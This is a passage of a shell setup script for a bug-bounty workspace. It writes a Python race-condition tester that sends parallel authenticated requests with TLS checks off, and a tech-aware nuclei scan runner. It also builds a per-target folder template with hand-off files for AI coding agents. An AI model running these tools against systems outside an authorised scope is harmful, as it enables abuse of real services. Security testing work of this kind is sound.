    h = {"Authorization": f"Bearer {token}", "Content-Type": "application/json"}
    if headers:
        h.update(headers)
    try:
        if method.upper() == "POST":
            r = requests.post(url, json=json.loads(data) if data else {}, headers=h, timeout=10, verify=False)
        else:
            r = requests.get(url, headers=h, timeout=10, verify=False)
        return r.status_code, r.text[:200]
    except Exception as e:
        return 0, str(e)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--url", required=True)
    p.add_argument("--method", default="POST")
    p.add_argument("--data", default="{}")
    p.add_argument("--token", required=True)
    p.add_argument("--threads", type=int, default=20)
    p.add_argument("--output", default="/tmp/race_results.txt")
    args = p.parse_args()

    print(f"[*] Sending {args.threads} parallel requests to {args.url}")
    results = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futures = [ex.submit(send_request, args.url, args.method, args.data, args.token) for _ in range(args.threads)]
        for f in concurrent.futures.as_completed(futures):
            results.append(f.result())

    status_counts = {}
    for code, body in results:
        status_counts[code] = status_counts.get(code, 0) + 1

    print(f"[+] Results: {status_counts}")
    with open(args.output, "w") as f:
        for i, (code, body) in enumerate(results):
            f.write(f"Request {i+1}: HTTP {code} — {body}\n")
    print(f"[+] Saved to {args.output}")

if __name__ == "__main__":
    import urllib3
    urllib3.disable_warnings()
    main()
PYEOF

cat > "$SKILLS/scripts/tech_nuclei_runner.py" << 'PYEOF'
#!/usr/bin/env python3
"""
Read tech-stack.md, match to nuclei template directories, run targeted scans.
Usage: python3 tech_nuclei_runner.py --tech-file tech-stack.md --targets live.txt --templates ~/nuclei-templates --output out.jsonl
"""
import argparse
import subprocess
import os
import re

TECH_TEMPLATE_MAP = {
    "wordpress":  ["wordpress"],
    "strapi":     ["strapi"],
    "jboss":      ["jboss"],
    "jenkins":    ["jenkins"],
    "gitlab":     ["gitlab"],
    "grafana":    ["grafana"],
    "kibana":     ["kibana"],
    "elasticsearch": ["elastic"],
    "spring":     ["spring"],
    "tomcat":     ["tomcat"],
    "php":        ["php"],
    "laravel":    ["laravel"],
    "drupal":     ["drupal"],
    "confluence": ["confluence"],
    "jira":       ["jira"],
    "redis":      ["redis"],
    "mongodb":    ["mongodb"],
    "docker":     ["docker"],
    "kubernetes": ["kubernetes", "k8s"],
    "graphql":    ["graphql"],
    "firebase":   ["firebase"],
    "aws":        ["aws"],
    "azure":      ["azure"],
}

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--tech-file", required=True)
    p.add_argument("--targets", required=True)
    p.add_argument("--templates", required=True)
    p.add_argument("--output", required=True)
    args = p.parse_args()

    with open(args.tech_file) as f:
        tech_content = f.read().lower()

    matched_dirs = []
    for tech, dirs in TECH_TEMPLATE_MAP.items():
        if tech in tech_content:
            for d in dirs:
                full = os.path.join(args.templates, "technologies", d)
                if os.path.isdir(full):
                    matched_dirs.append(full)
                # also check cves
                cve_dir = os.path.join(args.templates, "cves")
                if os.path.isdir(cve_dir):
                    matched_dirs.append(cve_dir)

    matched_dirs = list(set(matched_dirs))
    if not matched_dirs:
        print("[!] No matching tech template dirs found.")
        return

    print(f"[*] Running tech-specific templates: {matched_dirs}")
    for d in matched_dirs:
        cmd = [
            "nuclei", "-l", args.targets,
            "-t", d,
            "-rate-limit", "20",
            "-timeout", "10",
            "-silent", "-jsonl",
            "-o", args.output
        ]
        subprocess.run(cmd, timeout=300)
    print(f"[+] Done. Output: {args.output}")

if __name__ == "__main__":
    main()
PYEOF

chmod +x "$SKILLS/scripts/"*.py

echo "[*] All skill files written."

# ── CREATE SAMPLE TARGET STRUCTURE (template) ─────────────
TEMPLATE="$BASE/_TARGET_TEMPLATE"
mkdir -p \
  "$TEMPLATE/config" \
  "$TEMPLATE/recon/raw" \
  "$TEMPLATE/recon/processed" \
  "$TEMPLATE/recon/screenshots" \
  "$TEMPLATE/urls/raw" \
  "$TEMPLATE/urls/processed" \
  "$TEMPLATE/js/raw" \
  "$TEMPLATE/js/processed" \
  "$TEMPLATE/api" \
  "$TEMPLATE/auth" \
  "$TEMPLATE/idor" \
  "$TEMPLATE/business-logic" \
  "$TEMPLATE/cloud" \
  "$TEMPLATE/uploads" \
  "$TEMPLATE/poc" \
  "$TEMPLATE/evidence" \
  "$TEMPLATE/nuclei/raw" \
  "$TEMPLATE/screenshots" \
  "$TEMPLATE/logs" \
  "$TEMPLATE/reports/drafts" \
  "$TEMPLATE/reports/final" \
  "$TEMPLATE/gemini-handoff" \
  "$TEMPLATE/wordlists"

# Placeholder files so git/tools don't complain about empty dirs
for dir in $(find "$TEMPLATE" -type d); do
  touch "$dir/.gitkeep"
done

cat > "$TEMPLATE/config/scope.txt" << 'SCOPEOF'
# Paste raw HackerOne / Bugcrowd scope here
# In-scope:
# *.example.com
# api.example.com
# Out-of-scope:
# store.example.com
SCOPEOF

cat > "$TEMPLATE/config/creds.env" << 'CREDEOF'
# Test account credentials — NEVER commit or print
# export ACCOUNT_A_EMAIL=""
# export ACCOUNT_A_PASS=""
# export ACCOUNT_A_TOKEN=""
# export ACCOUNT_B_EMAIL=""
# export ACCOUNT_B_PASS=""
# export ACCOUNT_B_TOKEN=""
CREDEOF

cat > "$TEMPLATE/logs/commands.log" << 'LOGEOF'
# FORMAT: [TIMESTAMP] PURPOSE: <why> | CMD: <command> | OUTPUT: <file> | RESULT: <summary>
LOGEOF

cat > "$TEMPLATE/reports/findings.md" << 'EOF'
# Verified Findings — TARGET
<!-- Only manually verified vulnerabilities with impact and PoC go here -->
EOF

cat > "$TEMPLATE/reports/noise.md" << 'EOF'
# Noise / Dead Ends — TARGET
<!-- Low-value, scanner-only, false positives, or unverified candidates -->
EOF

cat > "$TEMPLATE/gemini-handoff/status.md" << 'EOF'
# Gemini Handoff Status — TARGET — Not started
EOF

echo "[*] Target template created at: $TEMPLATE"
echo ""
echo "════════════════════════════════════════"
echo " SETUP COMPLETE"
echo "════════════════════════════════════════"
echo ""
echo "Structure:"
echo "  ~/bugbounty/"
echo "  ├── config/           ← API keys, global config"
echo "  ├── skills/           ← All skill SKILL.md files"
echo "  │   └── scripts/      ← Python helper scripts"
echo "  └── _TARGET_TEMPLATE/ ← Copy this for each new target"
echo ""
echo "To start a new target hunt:"
echo "  T=att.com"
echo "  cp -r ~/bugbounty/_TARGET_TEMPLATE ~/bugbounty/\$T"
echo "  # Paste scope into ~/bugbounty/\$T/config/scope.txt"
echo "  # Add creds to ~/bugbounty/\$T/config/creds.env"
echo ""
echo "Then load Gemini with: GEMINI.md in ~/bugbounty/\$T/"
echo "And QwenCode with: QWEN.md in ~/bugbounty/\$T/"
